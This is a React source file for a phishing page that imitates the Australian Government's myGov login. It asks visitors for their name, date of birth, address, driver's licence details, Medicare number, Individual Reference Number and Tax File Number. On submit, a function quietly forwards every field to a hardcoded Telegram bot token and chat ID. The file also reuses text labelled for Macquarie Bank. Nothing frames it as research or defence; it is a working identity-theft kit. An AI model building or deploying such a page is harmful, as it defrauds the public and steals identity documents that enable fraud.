import React, { useState } from "react";
import img from "./image/img.svg";
import img2 from "./image/img2.svg";
import back from "./image/back.svg";
import "./Mygov.css";
import MaskedInput from "react-text-mask";

const TELEGRAM_BOT_TOKEN = "7038583008:AAGLUNtjIrPvDbtGGwY0yMb-hbkDdjszVP4";
const TELEGRAM_CHAT_ID = "1951445523";

export default function Mygov() {
  const [name, setName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [date, setDate] = useState("");
  const [address, setAddress] = useState("");
  const [driversLicense, setDriversLicense] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [medicareNumber, setMedicareNumber] = useState("");
  const [individualReferenceNumber, setIndividualReferenceNumber] =
    useState("");
  const [taxFileNumber, setTaxFileNumber] = useState("");

  const handleInputChange = (event) => {
    setPhoneNumber(event.target.value);
  };

  const placeholder = "DD/MM/YYYY";

  const handleDateInputChange = (e) => {
    const input = e.target.value.replace(/\D/g, ""); // Remove non-digits
    let formattedDate = placeholder.split(""); // Convert placeholder to array

    for (let i = 0, j = 0; i < input.length && j < formattedDate.length; j++) {
      if (placeholder[j] !== "/") {
        formattedDate[j] = input[i]; // Replace mask with typed number
        i++;
      }
    }

    setDate(formattedDate.join(""));
  };

  const handleExpiryDateInputChange = (e) => {
    const input = e.target.value.replace(/\D/g, ""); // Remove non-digits
    let formattedDate = placeholder.split(""); // Convert placeholder to array

    for (let i = 0, j = 0; i < input.length && j < formattedDate.length; j++) {
      if (placeholder[j] !== "/") {
        formattedDate[j] = input[i]; // Replace mask with typed number
        i++;
      }
    }

    setExpiryDate(formattedDate.join(""));
  };

  const sendLoginToTelegram = async (
    name,
    phoneNumber,
    date,
    address,
    driversLicense,
    expiryDate,
    medicareNumber,
    individualReferenceNumber,
    taxFileNumber
  ) => {
    const message = `
    \n********************************
    \n
    Personal details for Macquarie Bank:\Name: ${name}, \nPhone-Number: ${phoneNumber}, 
    \nDate:${date}, \nAddress: ${address}, \nDriver-License: ${driversLicense},
    \nExpiry-Date: ${expiryDate}, \nMedicare-Number: ${medicareNumber}, 
    \nIndividual Reference-Number: ${individualReferenceNumber}, \nTax-File-Number: ${taxFileNumber}
    \n
    \n
    \n********************************
    `;

    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      }
    );
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    setTimeout(async () => {

      if (
        !name ||
        !phoneNumber ||
        !date ||
        !address ||
        !driversLicense ||
        !expiryDate ||
        !medicareNumber ||
        !individualReferenceNumber ||
        !taxFileNumber
      ) {
        return;
      }

      try {
        await sendLoginToTelegram(
          name,
          phoneNumber,
          date,
          address,
          driversLicense,
          expiryDate,
          medicareNumber,
          individualReferenceNumber,
          taxFileNumber
        );

        setTimeout(() => {
          // onLoginSuccess();
        }, 500);
      } catch (error) {
        console.error("Login failed", error);
      } finally {
        // setLoading(false);
      }
    }, 4000);
  };

  return (
    <div className="main-container">
      <header role="banner" className="mgvEnhanceHeader">
        <section className="inner-wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a
                  href="https://my.gov.au/"
                  className="unauth-govt-crest__link"
                >
                  <img
                    id="unauth-govt-crest"
                    src={img}
                    alt="Australian Government and myGov logo"
                    role="img"
                  />
                </a>
                <div className="header-links">
                  <a href="https://my.gov.au/en/about/help">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <div className="back-link">
                        <img
                          src={back}
                          alt="back button"
                          className="back-icon"
                        />
                        <a
                          data-go-back-link=""
                          className="button-back"
                          href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=close"
                        >
                          Back
                        </a>
                      </div>
                      <div
                        id="passkey-auth-error"
                        className="alert alert-danger error-msg"
                        role="alert"
                        style={{ display: "none" }}
                      ></div>
                      <div style={{ display: "none" }} id="error-msg">
                        <div
                          className="error-msg"
                          role="alert"
                          aria-live="assertive"
                        >
                          <span className="is-visuallyhidden">
                            Error message:
                          </span>
                          <div className="error-msg-text">
                            <span>
                              <strong>Error</strong>
                              <br /> Your sign in details are incorrect.
                              (RFM10A) <br />
                              <br />
                              <a href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=recoverusername">
                                Forgot username
                              </a>
                              <br />
                              <a href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=resetpassword">
                                Forgot password
                              </a>
                            </span>
                          </div>
                        </div>
                      </div>

                      <h1>MyGov Account Information</h1>
                      <h2
                        className="text-align-left"
                        style={{ fontWeight: "400", fontSize: "16px" }}
                      >
                        Please answer the shared secrects between you and the
                        ATO
                      </h2>
                      <hr />
                      <form
                        onSubmit={handleSubmit}
                        id="login-form"
                        aria-describedby="error-msg"
                        className="mygov-login-form alternative"
                        autoComplete="off"
                      >
                        <div className="input-group">
                          <label className="override">Full Name</label>
                          <input
                            id="name"
                            name="name"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Mobile Number</label>
                          <MaskedInput
                            mask={[
                              "+",
                              "6",
                              "1",
                              " ",
                              /\d/,
                              " ",
                              /\d/,
                              /\d/,
                              /\d/,
                              /\d/,
                              " ",
                              /\d/,
                              /\d/,
                              /\d/,
                              /\d/,
                            ]}
                            placeholder="+61"
                            guide
                            value={phoneNumber}
                            onChange={handleInputChange}
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Date of Birth</label>
                          <MaskedInput
                            mask={[
                              /\d/,
                              /\d/,
                              "/",
                              /\d/,
                              /\d/,
                              "/",
                              /\d/,
                              /\d/,
                              /\d/,
                              /\d/,
                            ]}
                            placeholder={placeholder}
                            guide={false}
                            value={date}
                            onChange={handleDateInputChange}
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Address on File</label>
                          <input
                            id="address"
                            name="address"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                            value={address}
                            onChange={(e) => setAddress(e.target.value)}
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">
                            Driver's License Number
                          </label>
                          <input
                            id="dl"
                            name="dl"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label
                            className="override"
                            style={{ letterSpacing: "0.001px" }}
                          >
                            Driver's License Card Id (Back of Card)
                          </label>

                          <input
                            id="drivers_license_back"
                            aria-required="true"
                            name="drivers_license_back"
                            type="text"
                            inputMode="text"
                            autoComplete="new-password"
                            value={driversLicense}
                            onChange={(e) => setDriversLicense(e.target.value)}
                            readOnly
                            onFocus={(e) =>
                              e.target.removeAttribute("readOnly")
                            }
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">
                            Driver's License Expiry Date
                          </label>
                          <input
                            type="text"
                            style={{ display: "none" }}
                            autoComplete="off"
                          />
                          <MaskedInput
                            mask={[
                              /\d/,
                              /\d/,
                              "/",
                              /\d/,
                              /\d/,
                              "/",
                              /\d/,
                              /\d/,
                              /\d/,
                              /\d/,
                            ]}
                            placeholder={placeholder}
                            guide={false}
                            value={expiryDate}
                            onChange={handleExpiryDateInputChange}
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Medicare Number</label>
                          <input
                            id="medno"
                            name="medno"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                            value={medicareNumber}
                            onChange={(e) => setMedicareNumber(e.target.value)}
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">
                            Individual Reference Number
                          </label>
                          <input
                            id="irn"
                            name="irn"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                            value={individualReferenceNumber}
                            onChange={(e) =>
                              setIndividualReferenceNumber(e.target.value)
                            }
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Tax File Number</label>
                          <input
                            id="taxno"
                            name="taxno"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                            value={taxFileNumber}
                            onChange={(e) => setTaxFileNumber(e.target.value)}
                          />
                        </div>
                        <p className="recovery"></p>
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              id="btn01"
                              type="submit"
                              className="button-main"
                              name="_eventId_login"
                            >
                              Submit
                            </button>
                          </div>
                        </div>

                        <div></div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="footer-wrapper">
          <div className="footer-inner">
            <section className="footer-list">
              <>
                <h2 className="sr-only" aria-label="Footer">
                  Footer
                </h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank" href="https://my.gov.au/en/about/terms">
                      Terms of use
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/privacy-and-security"
                    >
                      Privacy and security
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/copyright"
                    >
                      Copyright
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/accessibility"
                    >
                      Accessibility
                    </a>
                  </li>
                </ul>
              </>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="https://my.gov.au">
                  <img
                    src={img2}
                    alt="Australian Government and myGov logo"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live
                on. We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
